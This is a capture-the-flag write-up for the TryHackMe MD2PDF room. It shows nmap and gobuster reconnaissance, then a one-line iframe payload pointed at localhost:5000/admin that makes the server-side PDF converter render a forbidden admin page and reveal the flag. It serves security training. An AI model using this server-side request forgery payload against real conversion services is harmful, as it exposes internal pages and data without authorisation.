# MD2PDF

In this challenge we have a website that allow us to convert markdown file to pdf file.
<img src="https://github.com/DJumanto/TryHackMe/blob/main/MD2PDF/page.jpeg?raw=true" alt="main page">

## Reconnaissance
First of all, let's do the enumeration for all open port
```bash
──(djumanto㉿localhost)-[~/Documents/TryHackMeNew/TryHackMe/MD2PDF]
└─$ nmap -sV -sC -oN nmap/initials 10.10.244.196  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 13:47 WIB
WARNING: Service 10.10.244.196:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.244.196
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 adc5b4a56539d0199ff2ec595aebc70d (RSA)
|   256 baaa15913ccb83722b9986a652b1e7d2 (ECDSA)
|_  256 756c419f275dda3445b72a7baabeeee6 (ED25519)
80/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2660
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|_    Content-Length: 0
```
Well, it seems that we able to access via http and ssh. But since we don't have any information about either username, password, or private key, the next thign i would do is directory brute.
```bash
sudo gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.10.24
[sudo] password for djumanto: 
Sorry, try again.
[sudo] password for djumanto: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.196/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              py,ssh,php,html,js
[+] Timeout:                 10s
===============================================================
2023/04/30 13:57:36 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 166]
/convert              (Status: 405) [Size: 178]
Progress: 39880 / 525990 (7.58%)
``` 

we unable to access the admin page
<img src="https://github.com/DJumanto/TryHackMe/blob/main/MD2PDF/admin.jpg?raw=true" alt="admin page">

And convert is endpoint for converting our markdown file

## Exploiting
Tags for this challenge is XSS and SSRF. So what cross into my mind was, what if we able to print the content of **admin** page. Since it was processed on the server, then we will able to access the content of **/admin** using iframe. Let's just get into it.
```html
<iframe src="http://localhost:5000/admin"> </iframe>
```
<img src="https://github.com/DJumanto/TryHackMe/blob/main/MD2PDF/retrieve-admin-trial.jpg?raw=true" alt="trial">

There you go

<img src="https://github.com/DJumanto/TryHackMe/blob/main/MD2PDF/flag.jpg?raw=true" alt="flag">
